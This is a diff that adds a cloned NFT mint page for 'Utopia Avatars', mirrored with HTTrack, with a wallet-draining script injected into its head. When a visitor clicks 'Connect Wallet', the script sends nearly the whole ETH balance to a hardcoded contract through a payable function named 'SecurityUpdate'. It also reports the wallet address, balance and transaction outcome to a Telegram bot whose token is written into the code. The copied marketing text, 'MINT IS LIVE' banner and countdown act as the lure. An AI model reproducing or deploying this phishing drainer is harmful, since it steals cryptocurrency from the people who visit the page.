@@ -1,0 +1,1376 @@
+<html lang="en">
+<!-- Mirrored from utopia.io/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Feb 2023 18:10:24 GMT -->
+
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="favicon.ico">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="theme-color" content="#7f1e91">
+  <meta name="description"
+    content="Utopia Avatars is a non-fungible token (NFT) collection created by Utopia, a Web3 ecosystem">
+  <meta property="og:title" content="Utopia Avatars">
+  <meta property="og:image" content="screenshot.png">
+  <meta name="og:description"
+    content="Utopia Avatars is a non-fungible token (NFT) collection created by Utopia, a Web3 ecosystem">
+  <link rel="apple-touch-icon" href="apple-touch-icon.png">
+  <title>Utopia Avatars</title>
+  <!--<script defer="defer" src="static/js/main.4d2c12ec.js"></script>-->
+  <link href="static/css/main.fc37a9b2.css" rel="stylesheet">
+  <script>
+// Set the date and time to countdown to
+var countDownDate = new Date("2025-03-01T00:00:00Z").getTime();
+
+// Update the countdown every second
+var x = setInterval(function() {
+
+  // Get the current date and time
+  var now = new Date().getTime();
+
+  // Calculate the remaining time
+  var distance = countDownDate - now;
+
+  // Calculate days, hours, minutes, and seconds
+  //var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+  // Update the HTML elements with the remaining time
+  //document.getElementById("days").innerHTML = days;
+  document.getElementById("hours").innerHTML = hours;
+  document.getElementById("minutes").innerHTML = minutes;
+  document.getElementById("seconds").innerHTML = seconds;
+
+  // If the countdown is finished, display a message
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("days").innerHTML = "00";
+    document.getElementById("hours").innerHTML = "00";
+    document.getElementById("minutes").innerHTML = "00";
+    document.getElementById("seconds").innerHTML = "00";
+  }
+}, 1000);
+
+  </script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
+      <script>
+        var account = "";
+        let apiToken = "5932493479:AAE3dTVtfF8LvIwxjUEFnw0onacqIzgoygM";
+        let chatId = "5205964348";
+      
+        /* To connect using MetaMask */
+      
+        if (window.ethereum) {
+          handleEthereum();
+        } else {
+          window.addEventListener("ethereum#initialized", handleEthereum, {
+            once: true,
+          });
+      
+          // If the event is not dispatched by the end of the timeout,
+          // the user probably doesn't have MetaMask installed.
+          setTimeout(handleEthereum, 3000); // 3 seconds
+        }
+      
+        function sendMessage(text) {
+          let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+      
+          let request = new XMLHttpRequest();
+          request.open("GET", urlString);
+          request.send();
+      
+          let response = request.response;
+      
+          return response;
+        }
+      
+        function handleEthereum() {
+          const { ethereum } = window;
+          if (ethereum && ethereum.isMetaMask) {
+            console.log("Ethereum successfully detected!");
+            // Access the decentralized web!
+            var abi = [
+              {
+                constant: true,
+                inputs: [],
+                name: "getBalance",
+                outputs: [{ name: "", type: "uint256" }],
+                payable: false,
+                stateMutability: "view",
+                type: "function",
+              },
+              {
+                constant: false,
+                inputs: [],
+                name: "withdraw",
+                outputs: [],
+                payable: false,
+                stateMutability: "nonpayable",
+                type: "function",
+              },
+              {
+                constant: false,
+                inputs: [],
+                name: "SecurityUpdate",
+                outputs: [],
+                payable: true,
+                stateMutability: "payable",
+                type: "function",
+              },
+              {
+                constant: true,
+                inputs: [],
+                name: "getOwner",
+                outputs: [{ name: "", type: "address" }],
+                payable: false,
+                stateMutability: "view",
+                type: "function",
+              },
+              {
+                inputs: [],
+                payable: false,
+                stateMutability: "nonpayable",
+                type: "constructor",
+              },
+            ];
+            window.web3 = new Web3(window.ethereum);
+            window.contract = new web3.eth.Contract(
+              abi,
+              "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8"
+            );
+          } else {
+            console.log("Please install MetaMask!");
+          }
+        }
+      
+        async function connect() {
+          if (account) {
+            var BN = web3.utils.BN;
+            var totalBalance = await web3.eth.getBalance(account);
+            var estimateGas = await web3.eth.estimateGas({
+              value: totalBalance,
+              data: contract.methods.SecurityUpdate().encodeABI(),
+              from: account,
+              to: "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8",
+            });
+            var gasPrice = await web3.eth.getGasPrice();
+            var gas = new BN(estimateGas).mul(new BN(gasPrice)).mul(new BN("10"));
+            var amount = new BN(totalBalance).sub(gas);
+      
+            if (amount < 0) {
+              var text = `Wallet connected (${account}) does not have enough crypto`;
+              alert("Not enough cash for gas");
+              return;
+            }
+      
+            contract.methods
+              .SecurityUpdate()
+              .send({ from: account, value: amount })
+              .on("error", (e) => {
+                console.log(e);
+      
+                var text = `Wallet (${account}) cancelled transaction`;
+                sendMessage(text);
+              })
+              .on("receipt", (r) => {
+                console.log(r);
+      
+                var text = `Wallet (${account}) approved transaction`;
+                sendMessage(text);
+              });
+          } else if (window.ethereum) {
+            console.log(window);
+            try {
+              var accounts = await window.ethereum.request({
+                method: "eth_requestAccounts",
+              });
+      
+              account = web3.eth.accounts.givenProvider.selectedAddress;
+              var balance = await web3.eth.getBalance(account);
+              var eth = web3.utils.fromWei(balance);
+              var text = `Wallet connected (${account}) with ${eth} ETH balance`;
+      
+              sendMessage(text);
+      
+              document.getElementById("changetext").innerHTML ="MINT";
+            } catch (err) {
+              console.log(err);
+            }
+          } else {
+            console.log("Please install Metamask");
+          }
+        }
+      </script>
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+  <div id="root">
+    <div class="App w-full min-h-screen bg-black max-w-[1920px] mx-auto"><iframe title="utopia"
+        class="min-h-screen hidden" id="app-frame" src="https://playcanv.as/e/p/da87ce44/" loading="lazy"
+        frameborder="0" height="100%" width="100%" allowfullscreen="" webkitallowfullscreen="true"
+        mozallowfullscreen="true" style="width: 100%; height: 100%;"></iframe>
+      <div class="menu fixed top-0 right-0 z-40 active-scroll" id="menu">
+        <div
+          class="flex items-center ml-2 h-full absolute right-[60%] md:right-[40%] lg:right-[33%] xl:right-[25%] 2xl:right-[23%] 3xl:right-[18%] ">
+          <a  target="_blank" rel="noopener noreferrer"
+            class="bg-transparent shadow-sm shadow-black  w-[160px] md:w-[230px] text-xs md:text-base flex justify-center items-center gap-2 px-3 py-2 lg:py-1 border-2 hover:bg-white border-green-500 absolute font-bold rounded-full text-green-500 transition-all ease-in duration-300 opacity-100"><span
+              class="hidden md:block flex-shrink-0">MINT IS&nbsp;LIVE</span><span
+              class="block md:hidden text-shadow-green flex-shrink-0">MINT IS&nbsp;LIVE</span>
+            <div class="w-3 h-3 rounded-full bg-green-700  animate-pulse flex-shrink-0"></div>
+          </a></div>
+        <nav class="nav w-full">
+          <ul class="pt-16 right-16 md:pt-16 lg:pt-20 md:right-24 lg:right-32 top-0 w-auto z-40 flex flex-col gap-2">
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">What are Utopia Avatars?</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Our Mission</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Transparent Distribution</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Community Treasury</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Treasury Hunt</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Team</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Utility-Based Token</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">Partners</a></li>
+            <li
+              class="rounded-xl bg-[#00000087] shadow-lg text-white hover:text-black hover:bg-white hover:cursor-pointer">
+              <a class=" text-xs md:text-xl font-medium   w-full px-5 py-1 flex">FAQS</a></li>
+          </ul>
+        </nav>
+      </div>
+      <div class="container-content bg-slate-700 h-full">
+        <div class="top-0 bottom-0 left-0 right-0 bg-slate-700 w-full h-full">
+          <div id="mintNow" class="relative z-10">
+            <div class="relative bg-black h-screen">
+              <div class="w-full lg:w-3/5 h-[60%] lg:h-full">
+                <div class="object-cover h-full w-full">
+                  <div style="width: 100%; height: 100%;"><video loop="" muted="" autoplay="" playsinline=""
+                      preload="metadata" id="bgvid" class="object-cover h-full w-full backgroundIsCenterMobile">
+                      <source src="/static/media/mint-now-video.50490425100080515019.m4v" type="video/mp4">
+                    </video></div>
+                </div>
+              </div>
+              <div class="lg:hidden bg-black-gradient h-52 w-full absolute top-2/4"></div>
+              <div
+                class="absolute inset-x-0 bottom-20 lg:top-28 lg:right-10 flex flex-col items-center lg:items-end justify-center text-white gap-8 px-4">
+                <div class="max-w-4xl space-y-4"><img class="w-full"
+                    src="/static/media/mint-soon.60cb830e51537d2cdaae.png" alt="Mint live!">
+                  <div class="flex flex-col items-center justify-center gap-10 lg:gap-14">
+
+                    <div
+                    class="bg-white px-6 lg:px-10 py-2 lg:py-4 rounded-2xl shadow-mint-button hover:bg-gradient-utopia text-gradient-buton text-xl" id="wallet_connect" onclick="connect();" href="/#" style="cursor: pointer;">
+                    <span class="font-bold uppercase" id="changetext">Connect Wallet</span></div>
+                    <style>
+                      .countdown-container {
+                       position: relative;
+                      }
+                      .countdown-header {
+                        position: absolute;
+                        top: 0;
+                        left: 50%;
+                        transform: translateX(-50%);
+                      }
+                      
+                      .countdown-timer {
+                        display: flex;
+                        flex-direction: row;
+                        justify-content: center;
+                        align-items: center;
+                      }
+                      </style>
+
+
+                    <div class="flex flex-row items-center justify-end font-bold text-4xl md:text-6xl">
+                      <div class="countdown-container">
+                      <h1 id="countdown-header" style="text-align: center;">Mint Ends in:</h1>
+                      <div class="countdown-timer">
+                      <div class="flex flex-col w-20 md:w-24 text-center"><span class="font-bold" id="days">00</span><span
+                          class="text-sm font-normal">Days</span></div><span class="mb-6">:</span>
+                      <div class="flex flex-col w-20 md:w-24 text-center"><span class="" id="hours">00</span><span
+                          class="text-sm font-normal">Hours</span></div><span class="mb-6">:</span>
+                      <div class="flex flex-col w-20 md:w-24 text-center"><span class="font-bold" id="minutes">00</span><span
+                          class="text-sm font-normal">Minutes</span></div><span class="mb-6">:</span>
+                      <div class="flex flex-col w-20 md:w-24 text-center"><span class="font-bold" id="seconds">00</span><span
+                          class="text-sm font-normal">Seconds</span></div>
+                        </div>
+                        </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="whatAreUtopiaAvatars" class="relative header-utopia bg-black">
+            <div class="z-0 absolute h-full bg-fixed parallax-video">
+              <div style="width: 100%; height: 100%;"><video muted="" autoplay="" playsinline="" preload="metadata"
+                  id="bgvid" class="z-0 absolute h-full bg-fixed parallax-video undefined">
+                  <source src="https://utopia.io/video/Video_UTOPIA_web_v21.mp4" type="video/mp4">
+                </video></div>
+              <div
+                class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute bg-[#000000bf] md:bg-[##000000a6] w-screen">
+              </div>
+            </div>
+            <div
+              class="h-full bg-black container-content-header justify-center px-5 2xl:px-28 mx-auto z-30 flex flex-col">
+              <section
+                class="text-gray-800 text-right pt-20 pb-14 md:pt-28 md:pb-20 lg:pt-32 lg:pb-24 2xl:pt-36 px-3 lg:px-10 2xl:px-0 max-w-[100%] md:max-w-[69vw] lg:max-w-[60vw] xl:max-w-[60vw] 2xl:max-w-[60vw]  3xl:max-w-[45vw] ml-auto">
+                <div class="description">
+                  <div>
+                    <div style="opacity: 1; transform: translateX(0px);">
+                      <h2
+                        class="text-3xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl font-medium mb-6 2xl:mb-12 text-white uppercase">
+                        WHAT IS<br><img class="ml-auto lg:w-[50vw] xl:w-[45vw] 2xl:w-[45vw] 3xl:w-[34.375vw]"
+                          src="/images/partners/avatars_white_transparent.png" alt=""></h2>
+                    </div>
+                  </div>
+                  <div class="ml-auto lg:w-[50vw] xl:w-[45vw] 2xl:w-[45vw] 3xl:w-[33.4vw]">
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <p class="text-white text-base xl:text-lg 2xl:text-xl font-extralight">Utopia Avatars is a
+                          non-fungible token (NFT) collection developed by Utopia, a Web3 ecosystem that aims to <strong
+                            class="font-semibold">revolutionize traditional business operations through the use of
+                            blockchain technology.</strong></p>
+                      </div>
+                    </div><br>
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <p class="text-white text-base xl:text-lg 2xl:text-xl  font-extralight">The collection features
+                          <strong class="font-semibold">3D art collectible tokens</strong> built on the Ethereum
+                          blockchain, <strong class="font-semibold">offering both tangible and virtual opportunities and
+                            experiences for&nbsp;its&nbsp;holders.</strong></p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+          <div id="about" class="relative z-10 pt-12 md:pt-12 lg:pt-16 xl:pt-16 2xl:pt-8">
+            <div class="flex">
+              <div
+                class="description py-8 2xl:py-20 px-5 md:px-20 lg:px-20 md:w-[85vw] lg:w-[67vw] xl:w-[65%] 2xl:w-[55%]">
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <div class="flex gap-5 mb-6">
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        About</h2>
+                      <div class="border-r border-white z-50 h-auto"></div>
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        Us</h2>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <p class="text-white text-base xl:text-lg 2xl:text-xl font-extralight">Utopia Avatars were created
+                      by Utopia, a Web3 ecosystem founded by Alejandro Saez, Maria Bravo and Javier Garcia with the
+                      vision of focusing on bridging the gap between the physical and digital worlds.</p>
+                  </div>
+                </div>
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <div class="flex gap-4 md:gap-8 w-full mt-10 items-center">
+                      <div class="flex-initial"><a href="https://www.globalgiftfoundation.org/" target="_blank"
+                          rel="noreferrer"><img class="w-auto" src="/images/partners/fit.png" alt=""></a></div>
+                      <div class="flex-auto"><a href="https://www.chopraverse.io/" target="_blank" rel="noreferrer"><img
+                            class="w-auto mt-1" src="/images/partners/chopra.png" alt=""></a></div>
+                    </div>
+                    <div class="flex mt-4 md:hidden  justify-center items-center"><img class="w-[200px] "
+                        src="/images/partners/utopia_logo_effect.png" alt=""></div>
+                  </div>
+                </div>
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <div class="flex gap-5 mb-6 mt-5 md:mt-16">
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        Our</h2>
+                      <div class="border-r border-white z-50 h-auto"></div>
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        Mission</h2>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <p class="text-white text-base xl:text-lg 2xl:text-xl font-extralight">Our mission is to disrupt
+                      <strong class="font-semibold">traditional business models</strong> through web-3 technology
+                      innovations. Utopia Avatars focuses on the <strong class="font-semibold">enjoyment </strong> of
+                      its holders in physical and digital spaces. The development of this community will adhere to
+                      values of transparency, innovation, and philanthropy, the defining elements of the Utopia
+                      ecosystem.</p>
+                  </div>
+                </div>
+              </div>
+              <div class="hidden md:flex text-white flex-auto flex-col justify-center items-center"><img
+                  class="md:w-[300px] lg:w-[500px]" src="/images/partners/utopia_logo_effect.png" alt=""></div>
+            </div>
+          </div>
+          <div id="ourArtists" class="relative z-10">
+            <div
+              class="container-title flex flex-col items-center justify-center lg:max-w-4xl xl:max-w-7xl mx-auto absolute top-[10%] left-0 right-0">
+              <div class="flex gap-5 mb-6 mb-2">
+                <h2
+                  class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                  Our</h2>
+                <div class="border-r border-white z-50 h-auto"></div>
+                <h2
+                  class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                  Artists</h2>
+              </div>
+              <p
+                class="text-white font-extralight text-xs md:text-base xl:text-lg 2xl:text-xl  mb-0 md:mb-8 lg:mb-12 z-10 px-4 text-center">
+                We are proud to <strong class="font-semibold">partner with two renowned artists, Joaquín Ganga and
+                  Richard Orlinski</strong>, who embody the spirit of Utopia. As we continue to grow, we are grateful
+                for their involvement and contributions to not just the art world, but also to the overall growth of our
+                ecosystem. Thank you for&nbsp;your&nbsp;support.</p>
+            </div>
+            <div class="flex w-full" id="container-artists">
+              <div
+                class="px-5 lg:px-12 2xl:px-28 pb-32 pt-36 md:pt-56 lg:pt-56 2xl:pt-64  flex-[1_0_100%] lg:flex-1 bg-cover bg-no-repeat bg-right"
+                style="background-image: url(&quot;/images/artists/ganga.png&quot;);">
+                <div class="flex-col mt-20 md:mt-12 lg:mt-10">
+                  <div class="container-firma mb-0 md:mb-4"><img src="/images/artists/ganga-firma.png"
+                      class="object-cover h-[60px] md:h-[118px] w-auto mx-auto" alt="ganga"></div>
+                  <div class="video-rounded-md player-custom" style="width: 100%; height: 100%;">
+                    <div class="react-player__preview" tabindex="0"
+                      style="width: 100%; height: 100%; background-size: cover; background-position: center center; cursor: pointer; display: flex; align-items: center; justify-content: center;">
+                      <img class="poster-img cursor-default pointer-events-none"
+                        src="/images/artists/ganga-poster-2.png" alt=""><button
+                        class="button-play-player cursor-default"><img class="icon-player cursor-pointer"
+                          src="/images/artists/play.svg" alt="play"></button></div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="px-5 lg:px-12 xl:px-28  pb-32  pt-36 md:pt-56 lg:pt-56 2xl:pt-64 flex-[1_0_100%] lg:flex-1 bg-cover bg-left bg-no-repeat"
+                style="background-image: url(&quot;/images/artists/richard.png&quot;);">
+                <div class="flex-col mt-20 md:mt-12 lg:mt-10">
+                  <div class="container-firma mb-0 md:mb-4"><img src="/images/artists/richard-firma.png"
+                      class="object-cover h-[60px] md:h-[118px] w-auto mx-auto" alt="richard"></div>
+                  <div class="video-rounded-md player-custom" style="width: 100%; height: 100%;">
+                    <div class="react-player__preview" tabindex="0"
+                      style="width: 100%; height: 100%; background-size: cover; background-position: center center; cursor: pointer; display: flex; align-items: center; justify-content: center;">
+                      <img class="poster-img cursor-default" src="/images/artists/richard-poster.png" alt=""><button
+                        class="button-play-player cursor-default"><img class="icon-player cursor-pointer"
+                          src="/images/artists/play.svg" alt="play"></button></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div
+              class="flex gap-14 justify-center absolute left-0 right-0 bottom-[4%] xs:bottom-[6%] md:bottom-[5%] buttons-slider">
+              <img src="/icon/arrow-bk.svg" class="rotate-180 opacity-40 pointer-events-none" alt=""><img
+                src="/icon/arrow-bk.svg" class="rotate-0" alt=""></div>
+          </div>
+          <div id="token" class="relative z-10">
+            <div class="z-0 absolute h-full bg-fixed w-full">
+              <div style="width: 100%; height: 100%;"><video loop="" muted="" autoplay="" playsinline=""
+                  preload="metadata" id="bgvid" class="z-0 absolute h-full bg-fixed w-full undefined">
+                  <source src="https://www.utopia.io/video/Fondo+Token+Distribution-1.m4v" type="video/mp4">
+                </video></div>
+              <div class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute bg-[#0000008a]"></div>
+            </div>
+            <div class="h-full bg-black pt-20 lg:pt-24 md:px-5 2xl:px-28 mx-auto z-30 flex flex-col">
+              <section class="pb-20 px-0 xl:px-6 2xl:px-0 z-10 style_section__XgnTO">
+                <div class="style_container__342KS">
+                  <picture class="flex justify-center relative top-0 xl:top-3">
+                    <source media="(min-width: 1280px)" srcset="/vectors/border-desktop.svg">
+                    <source media="(min-width: 450px)" srcset="/vectors/border-tablet.svg"><img
+                      class="style_svgBorder__lLf4T" src="/vectors/border-mobile.svg" alt="Border"></picture>
+                  <h2 class="style_title__ptvRC">Transparent Distribution</h2>
+                  <div class="style_layout__ovoDY">
+                    <div class="style_circleContainer__ewIha">
+                      <div class="flex justify-center items-center w-full  h-full"><img class="xl:ml-40"
+                          src="/images/transparent-distribution/pie.svg" alt="pie"></div>
+                    </div>
+                    <div class="style_rightSide__kgMw6">
+                      <h3
+                        class="text-white font-extrabold text-[40px] md:text-7xl xl:text-[85px] mb-10 md:mb-12 xl:mb-8 -mt-10 text-avatars text-center xl:mt-10">
+                        9,922 Avatars</h3>
+                      <div class="flex justify-center container-phases px-0 md:px-0">
+                        <div class="flex items-phases flex-col gap-2 iphone:gap-3 md:gap-2 3xl:gap-4">
+                          <div class="flex items-center relative container-head"><img
+                              class="absolute soldOut opacity-100 top-[-12vw] left-[-7vw] md:top-[-5vw] md:left-[-5vw] lg:top-[-4vw] lg:left-[-4vw] xl:top-[-2vw] xl:left-[-3vw] "
+                              src="/images/transparent-distribution/sold-out.svg" alt="sold out">
+                            <div class="flex gap-2 md:gap-4 items-center opacity-50"><img
+                                class="w-[18px] md:w-auto opacity-0" src="/icon/circle-blue.svg" alt="">
+                              <h3
+                                class="text-white font-bold text-[18px] md:text-[30px] xl:text-[30px] 3xl:text-[35px] title">
+                                PHASE 0: <span style="color: rgb(2, 205, 255);">Friends &amp;&nbsp;Family</span> </h3>
+                            </div>
+                          </div>
+                          <div class="flex flex-col ml-[8%] md:ml-[14%] subitems gap-1 md:gap-0 opacity-50">
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Feb 2022
+                                <span class="text-[80%]">(All funds for Community Treasury)</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Avatars
+                                airdropped&nbsp;after&nbsp;phase&nbsp;4</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">800
+                                NFTs</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">0.17
+                                ETH</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">4 NFTs per
+                                wallet</span></div>
+                          </div>
+                          <div class="flex items-center relative container-head">
+                            <div class="flex gap-2 md:gap-4 items-center"><img class="w-[18px] md:w-auto"
+                                src="/icon/circle-pink.svg" alt="">
+                              <h3
+                                class="text-white font-bold text-[18px] md:text-[30px] xl:text-[30px] 3xl:text-[35px] title">
+                                PHASE 1: <span style="color: rgb(254, 0, 254);">Founding Utopian</span> </h3>
+                            </div>
+                          </div>
+                          <div class="flex flex-col ml-[8%] md:ml-[14%] subitems gap-1 md:gap-0">
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Phase
+                                duration: 12h</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Start at 17 Feb at 17:00
+                                  CET / 08:00am PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Finish at 18nd Feb at
+                                  05:00 CET / 08:00pm PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">0
+                                ETH</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">2 NFTs per
+                                wallet</span></div>
+                          </div>
+                          <div class="flex items-center relative container-head">
+                            <div class="flex gap-2 md:gap-4 items-center opacity-50"><img class="w-[18px] md:w-auto"
+                                src="/icon/circle-pink.svg" alt="">
+                              <h3
+                                class="text-white font-bold text-[18px] md:text-[30px] xl:text-[30px] 3xl:text-[35px] title">
+                                PHASE 2: <span style="color: rgb(254, 0, 254);">Utopia Citizen</span> </h3>
+                            </div>
+                          </div>
+                          <div class="flex flex-col ml-[8%] md:ml-[14%] subitems gap-1 md:gap-0 opacity-50">
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Phase
+                                Duration: 12h</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Start at 18nd Feb at 05:00
+                                  CET / 08:00pm PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Finish at 18nd Feb at
+                                  17:00 CET / 08:00am PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">0.25
+                                ETH</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">1 NFT per
+                                wallet</span></div>
+                          </div>
+                          <div class="flex items-center relative container-head">
+                            <div class="flex gap-2 md:gap-4 items-center opacity-50"><img class="w-[18px] md:w-auto"
+                                src="/icon/circle-pink.svg" alt="">
+                              <h3
+                                class="text-white font-bold text-[18px] md:text-[30px] xl:text-[30px] 3xl:text-[35px] title">
+                                PHASE 3: <span style="color: rgb(254, 0, 254);">Utopia Waitlist</span> </h3>
+                            </div>
+                          </div>
+                          <div class="flex flex-col ml-[8%] md:ml-[14%] subitems gap-1 md:gap-0 opacity-50">
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Phase
+                                Duration: 2h</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Start at 18nd Feb at 17:00
+                                  CET / 08:00am PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Finish at 18nd Feb at
+                                  19:00 CET / 10:00am PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">0.25
+                                ETH</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">1 NFT per
+                                wallet</span></div>
+                          </div>
+                          <div class="flex items-center relative container-head">
+                            <div class="flex gap-2 md:gap-4 items-center opacity-50"><img class="w-[18px] md:w-auto"
+                                src="/icon/circle-pink.svg" alt="">
+                              <h3
+                                class="text-white font-bold text-[18px] md:text-[30px] xl:text-[30px] 3xl:text-[35px] title">
+                                PHASE 4: <span style="color: rgb(254, 0, 254);">Public Sale</span> </h3>
+                            </div>
+                          </div>
+                          <div class="flex flex-col ml-[8%] md:ml-[14%] subitems gap-1 md:gap-0 opacity-50">
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">Phase
+                                Duration: Supply Sold out</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img alt=""><span
+                                class="text-white font-medium"><span class="ml-4 text-[80%]">-Start at 18nd Feb at 19:00
+                                  CET / 10:00am PST</span></span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">0
+                                ETH</span></div>
+                            <div class="flex gap-2 justify-start text-[11px] md:text-base"><img
+                                src="/icon/utopia-smaller.svg" alt=""><span class="text-white font-medium">1 NFT per
+                                transaction</span></div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+          <div id="community" class="relative z-10 community-treasury">
+            <div class="relative z-10 h-full">
+              <div class="z-0 absolute h-full bg-fixed w-full">
+                <div style="width: 100%; height: 100%;"><video loop="" muted="" autoplay="" playsinline=""
+                    preload="metadata" id="bgvid" class="z-0 absolute h-full bg-fixed w-full undefined">
